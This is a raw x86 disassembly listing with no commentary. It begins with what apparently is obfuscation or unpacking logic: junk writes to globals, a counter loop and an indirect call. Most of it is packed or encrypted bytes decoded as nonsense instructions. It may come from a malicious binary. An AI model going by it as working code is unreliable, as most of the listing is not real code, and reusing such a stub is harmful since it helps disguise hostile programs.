  4038ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4038b1:	sub    DWORD PTR ds:0x42a266,0x42a2e2
  4038bb:	xor    eax,esi
  4038bd:	add    DWORD PTR ds:0x42a2ea,0x138
  4038c7:	xor    ecx,esi
  4038c9:	lea    ecx,[eax+ecx*1+0x64e5e2]
  4038d0:	and    DWORD PTR ds:0x42a26a,0x0
  4038da:	xor    eax,eax
  4038dc:	or     eax,DWORD PTR ds:0x42a26a
  4038e2:	inc    eax
  4038e3:	mov    ds:0x42a26a,eax
  4038e8:	cmp    DWORD PTR ds:0x42a26a,0x7
  4038ef:	jge    0x403935
  4038f5:	jmp    0x403910
  4038fa:	push   DWORD PTR [ebp-0x10]
  4038fd:	push   DWORD PTR [ebp-0x28]
  403900:	push   0x5cc9
  403905:	push   0x429181
  40390a:	call   DWORD PTR ds:0x42a3ca
  403910:	cmp    DWORD PTR ds:0x42a26a,0x6
  403917:	jne    0x403928
  40391d:	mov    eax,ds:0x42a26a
  403922:	inc    eax
  403923:	mov    ds:0x42a26a,eax
  403928:	cmp    DWORD PTR ds:0x42a26a,0x11
  40392f:	jb     0x4038da
  403935:	mov    eax,DWORD PTR [ebp-0xc]
  403938:	sbb    DWORD PTR ds:0x42a2c6,0x42a2f6
  403942:	xor    edx,edx
  403944:	or     DWORD PTR ds:0x42a29e,0x16dc
  40394e:	div    ecx
  403950:	or     eax,ecx
  403952:	mov    eax,DWORD PTR [ebp-0x8]
  403955:	xor    ecx,ecx
  403957:	xor    ecx,DWORD PTR ds:0x42a292
  40395d:	sbb    DWORD PTR ds:0x42a2fa,ecx
  403963:	mov    ecx,DWORD PTR [ebp-0x10]
  403966:	xor    eax,esi
  403968:	or     DWORD PTR ds:0x42a2c2,0x42a29a
  403972:	xor    ecx,esi
  403974:	sbb    DWORD PTR ds:0x42a2be,0x52cd
  40397e:	sub    eax,ecx
  403980:	cmp    edx,eax
  403982:	jne    0x408281
  403988:	mov    eax,DWORD PTR [ebp-0xc]
  40398b:	neg    ecx
  40398d:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  403994:	adc    ecx,eax
  403996:	jmp    0x405d47
  40399b:	inc    ebx
  40399c:	nop
  40399d:	jl     0x403948
  40399f:	rol    BYTE PTR [ecx-0x52337d56],1
  4039a5:	mov    ch,0x5d
  4039a7:	call   0xefae7c21
  4039ac:	pop    esi
  4039ad:	add    DWORD PTR [ebx-0x7c7ca111],0x39
  4039b4:	pushf  
  4039b5:	ins    BYTE PTR es:[edi],dx
  4039b6:	xchg   edx,eax
  4039b7:	cmp    edi,DWORD PTR [edi+0x30]
  4039ba:	lahf   
  4039bb:	dec    edx
  4039bc:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4039be:	sbb    esi,DWORD PTR [esi]
  4039c0:	lock in eax,dx
  4039c2:	leave  
  4039c3:	jo     0x403a0b
  4039c5:	scas   al,BYTE PTR es:[edi]
  4039c6:	out    0x95,eax
  4039c8:	loopne 0x403a3d
  4039ca:	cmp    al,0xe6
  4039cc:	push   ebx
  4039cd:	pop    esi
  4039ce:	jae    0x403a4f
  4039d0:	retf   0xd651
  4039d3:	cmc    
  4039d4:	mov    BYTE PTR [ebx-0x50],cl
  4039d7:	test   eax,0xddcdb087
  4039dc:	mov    esp,DWORD PTR [esi]
  4039de:	or     eax,0x2c68c45f
  4039e3:	aam    0x89
  4039e5:	dec    edx
  4039e6:	data16 outs dx,BYTE PTR ds:[esi]
  4039e8:	or     BYTE PTR [edi+0x5ba1f16d],0xe7
  4039ef:	xchg   ebp,eax
  4039f0:	mov    cs,WORD PTR [ecx]
  4039f2:	call   0xbad7ae98
  4039f7:	push   es
  4039f8:	shr    BYTE PTR [ebx+0x63],cl
  4039fb:	mov    eax,0xe7e20d1
  403a00:	dec    ebx
  403a01:	lds    ebx,FWORD PTR [ebx-0x1ef0161d]
  403a07:	mov    dh,0xe4
  403a09:	lods   al,BYTE PTR ds:[esi]
  403a0a:	lods   al,BYTE PTR ds:[esi]
  403a0b:	xor    dl,dh
  403a0d:	dec    esp
  403a0e:	pusha  
  403a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a10:	adc    al,0x44
  403a13:	stos   DWORD PTR es:[edi],eax
  403a14:	add    DWORD PTR [eax-0x4c8326dd],esp
  403a1a:	aaa    
  403a1b:	loop   0x4039d6
  403a1d:	popa   
  403a1e:	sar    BYTE PTR gs:[esp+ebp*2+0x15],1
  403a23:	dec    esi
  403a24:	(bad)  
  403a25:	jmp    FWORD PTR [esi]
  403a27:	dec    esi
  403a28:	sub    esp,edx
  403a2a:	fxch   st(7)
  403a2c:	hlt    
  403a2d:	jne    0x4039eb
  403a2f:	ror    DWORD PTR [edx+0x27],cl
  403a32:	inc    eax
  403a33:	mov    ds:0x5f1aaf0d,eax
  403a38:	sub    ebx,ebp
  403a3a:	sub    eax,0xe7fbbc6e
  403a3f:	mov    dh,0x84
  403a41:	xchg   ecx,eax
  403a42:	cmp    DWORD PTR [ebx+eax*1],esi
  403a45:	inc    eax
  403a46:	dec    ecx
  403a47:	jb     0x4039dd
  403a49:	xchg   ebp,eax
  403a4a:	ss scas al,BYTE PTR es:[edi]
  403a4c:	jmp    0xb80408ad
  403a51:	mov    si,0xfad9
  403a55:	arpl   WORD PTR [ecx],cx
  403a57:	xchg   edi,eax
  403a58:	and    ebp,DWORD PTR [edi-0x5e]
  403a5b:	fisub  DWORD PTR [eax-0x262c93d]
  403a61:	popf   
  403a62:	or     cl,ch
  403a64:	mov    ds:0xe5b0f023,eax
  403a69:	rcr    BYTE PTR [ebx-0x43cb2918],1
  403a6f:	pop    esi
  403a70:	mov    bl,0x8a
  403a72:	mov    WORD PTR [edi+0x6770b0e2],ds
  403a78:	dec    esi
  403a79:	and    BYTE PTR [eax],ch
  403a7b:	dec    edx
  403a7c:	mov    al,ds:0x599e652c
  403a81:	idiv   BYTE PTR gs:[edi-0x1d93eec5]
  403a88:	mov    ah,BYTE PTR [ecx-0x2f]
  403a8b:	pusha  
  403a8c:	mov    ?,edx
  403a8e:	mov    ds:0xa196a2a8,eax
  403a93:	mov    ds:0x133e14fc,al
  403a98:	dec    eax
  403a99:	call   0x3c16:0x4b51014a
  403aa0:	cmp    ah,dl
  403aa2:	sti    
  403aa3:	rol    BYTE PTR [ebp+0x68537b02],1
  403aa9:	popf   
  403aaa:	pop    ss
  403aab:	jecxz  0x403b19
  403aad:	lds    esi,FWORD PTR [ebx-0x484caad]
  403ab3:	std    
  403ab4:	pop    ebp
  403ab5:	das    
  403ab6:	div    BYTE PTR [ecx-0x69]
  403ab9:	inc    edi
  403aba:	cmc    
  403abb:	ror    DWORD PTR [ebp+0x51],0x43
  403abf:	dec    edx
  403ac0:	dec    esp
  403ac1:	sbb    ebp,edi
  403ac3:	jge    0x403b20
  403ac5:	sbb    DWORD PTR [ebp+0x33],edi
  403ac8:	push   ds
  403ac9:	sub    ah,BYTE PTR [ebx]
  403acb:	mov    ds:0x2ab523c2,eax
  403ad0:	daa    
  403ad1:	and    eax,0x38666fcb
  403ad6:	jno    0x403b06
  403ad8:	out    0xe1,eax
  403ada:	addr16 push es
  403adc:	mov    ?,ebp
  403ade:	retf   0x8947
  403ae1:	call   0xe2392439
  403ae6:	push   esi
  403ae7:	mov    dl,0x4f
  403ae9:	mov    ss,ebx
  403aeb:	dec    edx
  403aec:	inc    esp
  403aed:	and    eax,edx
  403aef:	gs cld 
  403af1:	pop    esp
  403af2:	dec    esi
  403af3:	dec    eax
  403af4:	ficom  WORD PTR ds:0x681523db
  403afa:	push   edi
  403afb:	sub    al,0x44
  403afd:	jns    0x403b54
  403aff:	rcr    DWORD PTR [ecx+edx*2-0x16],cl
  403b03:	sub    dh,bh
  403b05:	lahf   
  403b06:	pop    ds
  403b07:	daa    
  403b08:	fsubr  DWORD PTR [eax-0x1563aec1]
  403b0e:	mov    ch,BYTE PTR [edx+0x14]
  403b11:	mov    edx,0x2e4c1e7b
  403b16:	stos   DWORD PTR es:[edi],eax
  403b17:	call   0x146e:0x958032ba
  403b1e:	in     al,0x94
  403b20:	sti    
  403b21:	jb     0x403b1e
  403b23:	stos   BYTE PTR es:[edi],al
  403b24:	xchg   ch,dl
  403b26:	push   edi
  403b27:	iret   
  403b28:	aaa    
  403b29:	ja     0x403b54
  403b2b:	sbb    bh,BYTE PTR [ebx]
  403b2d:	dec    edi
  403b2e:	and    DWORD PTR gs:[esi],esp
  403b31:	repnz cmp eax,0xb7a152dc
  403b37:	pop    es
  403b38:	mov    ch,0x5f
  403b3a:	jmp    0xdea0d293
  403b3f:	ja     0x403b49
  403b41:	sub    al,ch
  403b43:	jo     0x403b2f
  403b45:	inc    edi
  403b46:	inc    esi
  403b47:	or     BYTE PTR [eax-0x48],0xa6
  403b4b:	and    ebx,DWORD PTR [ebp+0x63efd94a]
  403b51:	or     bl,BYTE PTR [edi+0x603d522c]
  403b57:	lahf   
  403b58:	mov    ds:0xe679514f,al
  403b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b5e:	imul   esi,DWORD PTR [edx],0x63
  403b61:	sbb    BYTE PTR ds:0xdc61ed57,0x5
  403b68:	daa    
  403b69:	push   eax
  403b6a:	dec    eax
  403b6b:	or     ebx,DWORD PTR [esi+ebp*4]
  403b6e:	pop    ecx
  403b6f:	shl    BYTE PTR [ebx-0x2e],1
  403b72:	mov    al,ds:0x6eba9ae5
  403b77:	test   edx,esp
  403b79:	cmc    
  403b7a:	cli    
  403b7b:	xchg   esp,eax
  403b7c:	clc    
  403b7d:	jp     0x403b6a
  403b7f:	pop    ebx
  403b80:	fdiv   DWORD PTR [edi+0x4]
  403b83:	lods   eax,DWORD PTR ds:[esi]
  403b84:	in     eax,dx
  403b85:	imul   esp,DWORD PTR ds:0x3d769cf6,0x5b
  403b8c:	jl     0x403b12
  403b8e:	inc    esp
  403b8f:	mov    BYTE PTR [ecx-0xdef27d5],dh
  403b95:	pop    esp
  403b96:	mov    dh,0x73
  403b98:	out    dx,al
  403b99:	adc    eax,0x99e287ca
  403b9e:	pop    es
  403b9f:	xchg   edi,eax
  403ba0:	mov    edi,0xc81ebc79
  403ba5:	pop    esp
  403ba6:	into   
  403ba7:	sub    BYTE PTR [ecx-0x20d4cafd],cl
  403bad:	or     BYTE PTR [ebp-0x75e7db4c],ch
  403bb3:	call   DWORD PTR [esi+0x1edc3014]
  403bb9:	nop
  403bba:	push   ss
  403bbb:	or     bh,BYTE PTR [eax+0x5b50f150]
  403bc1:	push   0xffffff9f
  403bc3:	lea    esp,[edx+ebp*2]
  403bc6:	pushf  
  403bc7:	loope  0x403c3a
  403bc9:	and    BYTE PTR [edx+0x22958151],ch
  403bcf:	loop   0x403b6d
  403bd1:	popf   
  403bd2:	aam    0xe
  403bd4:	mov    ah,0x4
  403bd6:	xchg   DWORD PTR [esi+ebx*1-0x142de94a],ebp
  403bdd:	test   eax,0x72c55052
  403be2:	sbb    DWORD PTR [ecx],eax
  403be4:	jmp    0x403c28
  403be6:	sahf   
  403be7:	xchg   ecx,eax
  403be8:	mov    ebp,0x14b7cb8a
  403bed:	or     al,0xec
  403bef:	cmc    
  403bf0:	repz jae 0x403be9
  403bf3:	pop    edx
  403bf4:	sbb    BYTE PTR [eax+0x5b],al
  403bf7:	sub    al,0x58
  403bf9:	xor    edi,edx
  403bfb:	mov    ah,0xa1
  403bfd:	int3   
  403bfe:	cli    
  403bff:	cmp    al,0x1d
  403c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c02:	int    0x21
  403c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c05:	dec    esp
  403c06:	(bad)  [eax-0x55]
  403c09:	mov    eax,0xb9b777e7
  403c0e:	leave  
  403c0f:	call   0x714:0xbd8c7f9b
  403c16:	xor    esi,0x76
  403c19:	sub    ecx,DWORD PTR [ebp+edi*2-0x1c737a12]
  403c20:	stos   BYTE PTR es:[edi],al
  403c21:	cmp    esp,edx
  403c23:	sbb    al,0x7d
  403c25:	out    0xef,eax
  403c27:	mov    eax,eax
  403c29:	sti    
  403c2a:	pop    ebp
  403c2b:	stc    
  403c2c:	adc    BYTE PTR [ecx-0x490090f7],0x13
  403c33:	stos   BYTE PTR es:[edi],al
  403c34:	cmp    dl,BYTE PTR [ebx+0x3f]
  403c37:	xor    eax,0x8630c206
  403c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c3d:	(bad)  
  403c3e:	in     al,0x8a
  403c40:	in     eax,0xb3
  403c42:	sbb    edx,esi
  403c44:	mov    eax,ebp
  403c46:	inc    esp
  403c47:	(bad)  
  403c48:	pop    edi
  403c49:	adc    ecx,edi
  403c4b:	daa    
  403c4c:	cmp    ecx,DWORD PTR ds:0xda4f856e
  403c52:	and    DWORD PTR [edx+0x611604d],edi
  403c58:	mov    al,ds:0x9f5b9bc5
  403c5d:	out    dx,eax
  403c5e:	xchg   ebx,eax
  403c5f:	in     al,0x14
  403c61:	dec    esi
  403c62:	jae    0x403ccc
  403c64:	pop    esp
  403c65:	(bad)  
  403c67:	int    0xc
  403c69:	shl    BYTE PTR [ecx-0x1e],1
  403c6c:	xor    BYTE PTR [eax+ecx*8-0x6b],dh
  403c70:	(bad)  [eax+0x1f]
  403c73:	jb     0x403cb4
  403c75:	jle    0x403ced
  403c77:	push   esp
  403c78:	(bad)  
  403c79:	js     0x403ce8
  403c7b:	ror    esi,1
  403c7d:	fldcw  WORD PTR [esi]
  403c7f:	jp     0xcdc06d6c
  403c85:	xor    eax,0xced38f8d
  403c8a:	mov    BYTE PTR fs:[eax+0x63],ch
  403c8e:	out    0x7b,eax
  403c90:	fdiv   st(4),st
  403c92:	outs   dx,BYTE PTR ds:[esi]
  403c93:	cmp    BYTE PTR [ebx],bh
  403c95:	hlt    
  403c96:	mov    ds:0x445e643c,al
  403c9b:	pop    ds
  403c9c:	pop    ds
  403c9d:	inc    ecx
  403c9e:	xchg   esi,eax
  403c9f:	imul   ebx,DWORD PTR [esi-0x7c3ad66f],0x605f6016
  403ca9:	xchg   esp,eax
  403caa:	dec    esp
  403cab:	push   eax
  403cac:	ins    DWORD PTR es:[edi],dx
  403cad:	popa   
  403cae:	or     eax,0x269ef58e
  403cb3:	or     eax,0x44ef7147
  403cb8:	xor    ah,BYTE PTR [eax]
  403cba:	mov    esp,DWORD PTR [eax+0x4324f719]
  403cc0:	lock sti 
  403cc2:	xchg   esi,eax
  403cc3:	mov    ch,0xc
  403cc5:	dec    edi
  403cc6:	sbb    BYTE PTR [ebx],dh
  403cc8:	outs   dx,DWORD PTR ds:[esi]
  403cc9:	inc    eax
  403cca:	fadd   DWORD PTR [ebx-0x75e7515e]
  403cd0:	adc    al,0x8c
  403cd2:	push   0xb2b762a6
  403cd7:	sbb    cl,al
  403cd9:	je     0x403d26
  403cdb:	add    al,0x39
  403cdd:	hlt    
  403cde:	inc    ecx
  403cdf:	inc    esi
  403ce0:	bound  edx,QWORD PTR [ebx+0x4280bc54]
  403ce6:	pop    ebx
  403ce7:	(bad)  
  403ce8:	mov    WORD PTR [edx],?
  403cea:	iret   
  403ceb:	(bad)  
  403cec:	ds iret 
  403cee:	jo     0x403cee
  403cf0:	aas    
  403cf1:	gs (bad) 
  403cf4:	rcr    BYTE PTR [esp+ecx*2-0x2a051129],cl
  403cfb:	push   cs
  403cfc:	add    BYTE PTR [edi],dh
  403cfe:	nop
  403cff:	xchg   esi,ebp
  403d01:	sbb    al,0x0
  403d03:	mov    esi,cs
  403d05:	mov    al,0xe2
  403d07:	ror    BYTE PTR [esp+ebp*8],cl
  403d0a:	inc    ebp
  403d0b:	mov    al,ds:0x8a07fb9f
  403d10:	jnp    0x403d45
  403d12:	cdq    
  403d13:	mov    bl,bl
  403d15:	dec    esi
  403d16:	pop    esi
  403d17:	fmul   st(1),st
  403d19:	dec    ebx
  403d1a:	es mov ebx,0xcab04a90
  403d20:	sub    eax,0x29c87c7f
  403d25:	imul   esi,DWORD PTR [ebx],0x875269ca
  403d2b:	xlat   BYTE PTR ds:[ebx]
  403d2c:	sub    al,0x66
  403d2e:	jle    0x403cd9
  403d30:	xchg   BYTE PTR [edx-0x703c7be],bh
  403d36:	xor    esi,edi
  403d38:	jmp    0x2d90:0xe58fb56
  403d3f:	and    ch,0xb2
  403d42:	dec    esi
  403d43:	mov    eax,0x96ef5d14
  403d48:	(bad)  
  403d49:	mov    ah,0xde
  403d4b:	and    dl,BYTE PTR [ebx]
  403d4d:	xchg   ebx,eax
  403d4e:	jo     0x403cef
  403d50:	aad    0xb5
  403d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d53:	fdivrp st(0),st
  403d55:	aaa    
  403d56:	in     eax,dx
  403d57:	sbb    al,0xaf
  403d59:	bound  ebx,QWORD PTR [ecx]
  403d5b:	mov    ebp,0xc3ca0a3
  403d60:	or     al,0x52
  403d62:	sahf   
  403d63:	in     al,dx
  403d64:	int3   
  403d65:	stos   DWORD PTR es:[edi],eax
  403d66:	je     0x403cf4
  403d68:	repnz xor eax,0x29c590e7
  403d6e:	out    dx,eax
  403d6f:	enter  0x1dd7,0xcd
  403d73:	mov    esi,0xd28a8777
  403d78:	lods   al,BYTE PTR ds:[esi]
  403d79:	pop    ss
  403d7a:	stos   DWORD PTR es:[edi],eax
  403d7b:	pop    ebx
  403d7c:	jge    0x403d39
  403d7e:	scas   eax,DWORD PTR es:[edi]
  403d7f:	or     ebx,DWORD PTR [ebp+0x6d]
  403d82:	xor    eax,DWORD PTR [esi+0x6a1b7264]
  403d88:	fld    DWORD PTR [esi]
  403d8a:	adc    BYTE PTR [ebx+edi*2],bl
  403d8d:	aad    0x2a
  403d8f:	jmp    0x4474434c
  403d94:	outs   dx,BYTE PTR ds:[esi]
  403d95:	aaa    
  403d96:	dec    ebx
  403d97:	sbb    dh,bl
  403d99:	lods   eax,DWORD PTR ds:[esi]
  403d9a:	xor    BYTE PTR [edi+eiz*8],0x53
  403d9e:	loop   0x403d7c
  403da0:	loope  0x403df8
  403da2:	repz and ebp,ecx
  403da5:	dec    eax
  403da6:	stos   BYTE PTR es:[edi],al
  403da7:	xor    ebx,DWORD PTR [eax-0x71]
  403daa:	inc    ecx
  403dab:	gs sub edi,edi
  403dae:	stos   DWORD PTR es:[edi],eax
  403daf:	cdq    
  403db0:	mov    gs,WORD PTR es:[edi]
  403db3:	and    BYTE PTR [ebx],0xc8
  403db6:	dec    edx
  403db7:	sbb    eax,0xa86ab82e
  403dbc:	cs push esi
  403dbe:	mov    DWORD PTR [edi],ecx
  403dc0:	pop    es
  403dc1:	jl     0x403dab
  403dc3:	retf   0xb4c4
  403dc6:	popa   
  403dc7:	shl    DWORD PTR [esi-0x5eac68aa],0xe
  403dce:	pop    ecx
  403dcf:	jle    0x403d65
  403dd1:	leave  
  403dd2:	fisubr WORD PTR [ecx+esi*8-0x27]
  403dd6:	out    0xe0,eax
  403dd8:	pop    esi
  403dd9:	into   
  403dda:	das    
  403ddb:	(bad)  
  403ddc:	fadd   QWORD PTR [edi+0x53f0c607]
  403de2:	push   esi
  403de3:	int    0xa7
  403de5:	add    eax,0xdfecf232
  403dea:	scas   eax,DWORD PTR es:[edi]
  403deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dec:	lds    ebx,FWORD PTR [edi]
  403dee:	daa    
  403def:	test   BYTE PTR [ebx+0x4160cf98],bh
  403df5:	inc    ebp
  403df6:	xlat   BYTE PTR ds:[ebx]
  403df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403df8:	mov    DWORD PTR [esi+0x7a4ade62],esi
  403dfe:	mov    al,ds:0x63358bbd
  403e03:	sti    
  403e04:	dec    edx
  403e05:	sbb    ch,BYTE PTR [edi-0x2e]
  403e08:	aas    
  403e09:	je     0x403e25
  403e0b:	and    BYTE PTR [ebp+0x5f],dh
  403e0e:	mov    dl,0xe7
  403e10:	nop
  403e11:	sbb    eax,DWORD PTR ds:[eax-0x64b10b2c]
  403e18:	int    0x47
  403e1a:	mov    esp,0xf9ab03f1
  403e1f:	ins    BYTE PTR es:[edi],dx
  403e20:	popa   
  403e21:	jmp    FWORD PTR [eax-0x52]
  403e24:	fld    QWORD PTR [esi-0x571f48f5]
  403e2a:	sbb    ebp,esi
  403e2c:	pop    esi
  403e2d:	sbb    esi,DWORD PTR [ebp+0x45]
  403e30:	pusha  
  403e31:	xor    eax,0x74392a66
  403e36:	fldenv [esi+0x30]
  403e39:	(bad)  
  403e3a:	mov    eax,ds:0x16f6b9eb
  403e3f:	xor    al,0x5b
  403e41:	in     eax,dx
  403e42:	out    0x7d,al
  403e44:	sbb    eax,0x8bab244c
  403e49:	jge    0x403e3a
  403e4b:	(bad)  
  403e4c:	int    0x53
  403e4e:	pop    ss
  403e4f:	mov    edi,0x7a53ed22
  403e54:	sbb    dl,BYTE PTR [ebx+0x488ed6e5]
  403e5a:	mov    bh,BYTE PTR [ebx]
  403e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e5d:	jae    0x403e6b
  403e5f:	mov    ecx,0x2b11eb0f
  403e64:	xchg   ecx,eax
  403e65:	mov    bh,0xd
  403e67:	stc    
  403e68:	push   ds
  403e69:	jno    0x403e90
  403e6b:	fiadd  DWORD PTR [ecx+eiz*2]
  403e6e:	push   cs
  403e6f:	outs   dx,DWORD PTR ds:[esi]
  403e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e71:	ret    
  403e72:	bound  edx,QWORD PTR [ecx+0x68]
  403e75:	sbb    BYTE PTR [esi+0x73],ah
  403e78:	push   cs
  403e79:	xor    BYTE PTR [esi+0x76],bl
  403e7c:	mov    esp,0x6d245f62
  403e81:	fmul   st(5),st
  403e83:	retf   0x7644
  403e86:	cld    
  403e87:	in     eax,0x99
  403e89:	int    0xe3
  403e8b:	cli    
  403e8c:	aas    
  403e8d:	daa    
  403e8e:	test   al,0x4a
  403e90:	sahf   
  403e91:	mov    al,ds:0x77b32ea3
  403e96:	mov    ds:0xb481a8b,eax
  403e9b:	mov    ebx,DWORD PTR ds:0xc816752f
  403ea1:	cmp    eax,0x2f8d6b93
  403ea6:	(bad)  
  403ea8:	inc    edx
  403ea9:	fnstcw WORD PTR [ecx]
  403eab:	popa   
  403eac:	or     ch,BYTE PTR [ebx]
  403eae:	loop   0x403e64
  403eb0:	sub    ebp,eax
  403eb2:	push   0xd9b68e58
  403eb7:	adc    DWORD PTR [ebx-0x1f89d271],0xffffff97
  403ebe:	inc    eax
  403ebf:	mov    eax,ds:0xac9b4865
  403ec4:	jecxz  0x403e7b
  403ec6:	sar    DWORD PTR [eax],0x89
  403ec9:	stc    
  403eca:	iret   
  403ecb:	std    
  403ecc:	cmp    al,BYTE PTR [esi-0x5538354c]
  403ed2:	jns    0x403f53
  403ed4:	hlt    
  403ed5:	test   bl,0xc2
  403ed8:	mov    DWORD PTR [esi+0x4677575a],edx
  403ede:	ds aaa 
  403ee0:	ja     0x403ee8
  403ee2:	inc    ebp
  403ee3:	sbb    al,0xa8
  403ee5:	pop    ds
  403ee6:	shr    DWORD PTR [edi-0x73562a7d],0x57
  403eed:	repz pop ebp
  403eef:	jae    0x403f62
  403ef1:	dec    ebp
  403ef2:	cmp    bh,BYTE PTR [eax]
  403ef4:	in     eax,dx
  403ef5:	mov    ch,0x39
  403ef7:	rol    DWORD PTR [edi-0x69],0xbf
  403efb:	fistp  QWORD PTR [edx-0xe]
  403efe:	aaa    
  403eff:	fidiv  WORD PTR [edi]
  403f01:	mov    ecx,0xdf579322
  403f06:	cmp    DWORD PTR [ebx],edx
  403f08:	idiv   edi
  403f0a:	xchg   esp,ebx
  403f0c:	sbb    bl,BYTE PTR [eax-0x4ad3fe76]
  403f12:	dec    edi
  403f13:	cmp    BYTE PTR [esi-0x5f],bh
  403f16:	mov    edi,0x791ef0de
  403f1b:	add    esi,ecx
  403f1d:	xchg   edi,eax
  403f1e:	stos   DWORD PTR es:[edi],eax
  403f1f:	leave  
  403f20:	je     0x403f36
  403f22:	mov    dl,0xb8
  403f24:	aad    0x73
  403f26:	aam    0xf2
  403f28:	jns    0x403ef9
  403f2a:	xchg   esi,eax
  403f2b:	in     eax,0xbc
  403f2d:	jle    0x403f24
  403f2f:	jl     0x403f41
  403f31:	cdq    
  403f32:	cmc    
  403f33:	neg    BYTE PTR [esi+0x2b79f8dd]
  403f39:	push   es
  403f3a:	dec    esp
  403f3b:	adc    ebp,edx
  403f3d:	(bad)  
  403f3e:	dec    ebp
  403f3f:	sbb    esp,DWORD PTR [edx]
  403f41:	mov    ebp,0x260ca3e1
  403f46:	sbb    DWORD PTR [ebx+edi*4-0x56a9766c],0xffffffbd
  403f4e:	jge    0x403f5b
  403f50:	xchg   ecx,eax
  403f51:	sbb    DWORD PTR [edx],esi
  403f53:	jbe    0x403ed9
  403f55:	(bad)  
  403f56:	repnz mov ebp,0x499f179
  403f5c:	fidivr WORD PTR [ecx+0x5ed944c6]
  403f62:	xchg   esp,eax
  403f63:	sbb    BYTE PTR [ebp-0x5553c8e3],bh
  403f69:	call   0x9c134ab3
  403f6e:	in     eax,dx
  403f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f70:	(bad)  
  403f72:	fist   DWORD PTR [ebx-0x6f9427a9]
  403f78:	(bad)  
  403f79:	popf   
  403f7a:	mov    BYTE PTR [ebp+0x28],0x76
  403f7e:	cmp    edx,DWORD PTR [ebp-0x6e2f5388]
  403f84:	jne    0x403f9d
  403f86:	imul   ecx,DWORD PTR [edi+0x2c757d25],0x7b
  403f8d:	mov    dh,0xac
  403f8f:	rcl    BYTE PTR [edi],1
  403f91:	icebp  
  403f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f93:	sub    DWORD PTR [ebp-0x1d],esp
  403f96:	jl     0x403fbf
  403f98:	shl    ecx,cl
  403f9a:	pop    esp
  403f9b:	fs push edi
  403f9d:	mov    dl,0x70
  403f9f:	and    DWORD PTR [eax*8+0x4e5ef744],eax
  403fa6:	sbb    DWORD PTR [esi-0x25e0c96],esi
  403fac:	lock mov ebp,0x3af84905
  403fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fb3:	(bad)  
  403fb4:	call   0x9e16:0x7c8e1d31
  403fbb:	dec    edx
  403fbc:	xchg   ecx,eax
  403fbd:	or     eax,0x3144c820
  403fc2:	adc    eax,0x330ddbe3
  403fc7:	ss pop ds
  403fc9:	loop   0x403fd7
  403fcb:	add    al,0xb6
  403fcd:	aam    0x4b
  403fcf:	xchg   edi,eax
  403fd0:	push   0xffffff8a
  403fd2:	jo     0x403fd4
  403fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fd5:	in     eax,dx
  403fd6:	add    bh,cl
  403fd8:	lds    esi,FWORD PTR [edx-0x63]
  403fdb:	sti    
  403fdc:	and    al,dh
  403fde:	fdiv   QWORD PTR ds:0x1c4c1902
  403fe4:	push   ecx
  403fe5:	lods   al,BYTE PTR ds:[esi]
  403fe6:	pop    ebx
  403fe7:	dec    ebx
  403fe8:	dec    esp
  403fe9:	cld    
  403fea:	hlt    
  403feb:	cwde   
  403fec:	repz push esi
  403fee:	in     al,dx
  403fef:	sbb    dh,ah
  403ff1:	push   eax
  403ff2:	push   ebx
  403ff3:	cmp    BYTE PTR [edx-0x29],bh
  403ff6:	repz mov bh,0x48
  403ff9:	(bad)  
  403ffa:	mov    DWORD PTR [eax+0xa5bb3aa],edx
  404000:	into   
  404001:	dec    edi
  404002:	sbb    DWORD PTR [ebp+eiz*4+0x76634598],edi
  404009:	nop
  40400a:	mov    bl,0x84
  40400c:	ins    BYTE PTR es:[edi],dx
  40400d:	inc    esp
  40400e:	cmp    BYTE PTR [edx-0x2ed0aa3],0xd9
  404015:	mov    cl,0xc7
  404017:	push   edi
  404018:	shl    DWORD PTR [edx-0x35c64b12],1
  40401e:	mov    BYTE PTR [edi+ecx*8-0x6f848a0],ch
  404025:	fimul  DWORD PTR [ecx]
  404027:	fstp   DWORD PTR [edx]
  404029:	test   DWORD PTR [ecx],0x858f874a
  40402f:	push   esi
  404030:	retf   
  404031:	pushf  
  404032:	sub    eax,0x59f681a0
  404037:	in     eax,dx
  404038:	and    eax,0xb29c49ab
  40403d:	add    BYTE PTR [ecx+edi*4+0x6633d501],0x7a
  404045:	mov    edx,0x3b02e0ef
  40404a:	ret    
  40404b:	test   al,0x3
  40404d:	jb     0x40404d
  40404f:	sbb    al,0xb0
  404051:	imul   ebx,DWORD PTR [ecx+0x6b53d28f],0x6f8f6684
  40405b:	not    ebp
  40405d:	mov    ebp,DWORD PTR [edi-0x63]
  404060:	or     al,0x26
  404062:	cmp    eax,0x27263c4a
  404067:	inc    ebp
  404068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404069:	mov    ebx,0x67b766ce
  40406e:	inc    edi
  40406f:	js     0x4040af
  404071:	cmp    ebx,esp
  404073:	pop    ss
  404074:	(bad)  
  404075:	pop    ebp
  404076:	leave  
  404077:	xchg   esp,eax
  404078:	and    esp,DWORD PTR [ebx]
  40407a:	cmp    DWORD PTR [edx+0x57],esp
  40407d:	cmp    BYTE PTR [ecx+0x28d0da21],0xde
  404084:	and    DWORD PTR [edx],esp
  404086:	sbb    dl,0xaa
  404089:	mov    edi,0xb1756d53
  40408e:	inc    ebp
  40408f:	inc    edi
  404090:	in     al,dx
  404091:	into   
  404092:	loop   0x4040e2
  404094:	ins    DWORD PTR es:[edi],dx
  404095:	mov    WORD PTR [esi+0xd],ds
  404098:	arpl   WORD PTR [ecx],dx
